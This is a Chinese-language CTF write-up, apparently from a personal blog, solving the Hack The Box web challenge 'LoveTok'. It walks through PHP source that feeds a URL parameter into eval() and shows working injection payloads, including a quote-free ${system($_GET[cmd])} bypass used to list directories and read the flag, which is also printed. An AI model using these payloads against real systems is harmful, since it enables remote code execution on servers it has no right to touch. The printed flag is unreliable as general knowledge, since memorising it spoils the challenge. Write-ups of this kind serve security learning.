---
title: HTB-LoveTok
date: 2025-04-02 13:17:21
categories: 
  - CTF
  - Web
tags: [Web,HTB,Injection,PHP 代码注入,PHP]
excerpt: ""
---

## **题目描述**

![image-20250328113148491](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328113148491.png)

（有附件）



## **观察**

打开网页：

![image-20250328123105992](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328123105992.png)

当点击了下面那个按钮之后网页的url会增加一个参数：

![image-20250328123653124](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328123653124.png)

```
/?format=r
```

因为给的附件比较多，所以直接挨个搜索“format”，可以确定下来2份相关代码：

```php+HTML
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

这里会直接接收（没有过滤）我们传入的 format 的值，然后调用 TimeModel 处理这个值。

```php+HTML
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);
        # 把用户输入的 format 做了 addslashes() 处理，会把 ", ', \, NULL 这些内容前面加上反斜杠进行转义。

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

注意，PHP 的 `eval()`  函数会把传入的字符串当作 PHP 代码来执行。所以这道题可以通过注入php代码（不能包含  `"`, `'`, `\`, `NULL`）来获取flag。



首先尝试

```php+HTML
/?format=${system(ls)}
```

![image-20250328123405721](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328123405721.png)

发现会显示当前目录下的文件，但是这里没有flag。所以需要浏览其他目录（比如说根目录）下的文件。

而访问跟目录的话则需要将代码改成这样

```php+HTML
/?format=${system("ls /")}
```

但正如之前阅读代码发现的，引号等内容会被过滤掉。所以需要考虑更复杂的注入。

## 渗透

我们可以利用PHP的变量引用机制。我们通过这样

```python
/?format=${system($_GET[cmd])}&cmd=ls /
```

先将cmd的值定义成"ls /" 然后再传进前面的内容，这样一来就不需要直接使用引号了，意味着可以成功绕过输入过滤检测：

![image-20250328123344284](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328123344284.png)

最后直接读取flag即可：

```python
/?format=${system($_GET[cmd])}&cmd=cat%20/flagrPWYp
```

![image-20250328123508423](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250328123508423.png)

拿到flag：`HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}` 。
